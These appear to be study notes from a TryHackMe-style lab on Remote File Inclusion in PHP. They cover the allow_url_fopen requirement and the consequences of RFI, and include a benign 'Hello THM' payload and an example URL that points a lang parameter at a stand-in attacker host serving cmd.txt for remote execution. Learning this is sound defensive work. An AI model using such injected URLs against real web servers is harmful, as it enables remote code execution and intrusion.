RFI is a technique to include remote files into a vuln app. Like LFI, RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. One requirement for RFI is that the **allow_url_fopen** option needs to be on .

The risk is higher than LFI since RFI vulns allow an attacker to gain RCE on the server. Other conseuqesnces of a successful RFI attack include:

- sensitive information disclusure
- XSS
- DoS

![[Pasted image 20260508164845.png]]

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.